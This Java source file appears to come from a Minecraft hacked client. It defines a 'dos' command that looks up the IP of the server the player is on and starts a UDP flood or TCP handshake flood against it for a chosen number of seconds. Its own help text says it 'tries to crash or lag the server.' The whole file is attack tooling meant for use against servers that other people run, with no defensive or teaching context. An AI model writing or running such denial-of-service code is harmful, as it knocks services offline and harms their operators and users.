package me.robbanrobbin.jigsaw.client.commands;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;

import me.robbanrobbin.jigsaw.client.commands.option.CommandOption;
import me.robbanrobbin.jigsaw.client.modules.DoSMod;
import net.minecraft.client.multiplayer.ServerAddress;

public class CommandDos extends Command {

	@Override
	public void run(String[] commands) {
		if(DoSMod.flooding) {
			addResult("§cAlready DoSing!!");
			return;
		}
		if(mc.getCurrentServerData() == null) {
			addResult("§cYou are not on a server!");
			return;
		}
		if (commands.length < 2) {
			addResult("§cEnter the DoS time!");
			return;
		}
		if (commands.length < 3) {
			addResult("§cEnter the DoS type!");
			return;
		}
		final int time = Integer.parseInt(commands[1]);
		final int type = Integer.parseInt(commands[2]);
		if(type != 1 && type != 2) {
			addResult("§cUknown DoS type: " + type + ". Only 1 and 2 are permitted!");
			return;
		}
		final byte[] bytes = new byte[1024];
		final Random rand = new Random();
		InetAddress addr = null;
		try {
			addr = InetAddress.getByName(ServerAddress.fromString(mc.getCurrentServerData().serverIP).getIP());
		} catch (UnknownHostException e2) {
			e2.printStackTrace();
		}
		if(addr == null) {
			addResult("§cError finding ip! Server hostname might not be registered §cin most DNS servers yet...");
			return;
		}
		final InetAddress addrrrrr = addr;
		DoSMod.startFlooding(addrrrrr, bytes, rand, time, type);
		
	}

	@Override
	public String getActivator() {
		return "dos";
	}

	@Override
	public String getSyntax() {
		return "dos <time in seconds> <1(UDP)/2(TCP)>";
	}

	@Override
	public String getDesc() {
		return "Tries to crash or lag the server. Type 1 is UDP flood. Type 2 is experimental TCP handshake flood.";
	}

	@Override
	public CommandOption[] setOptions() {
		// TODO Auto-generated method stub
		return null;
	}
}
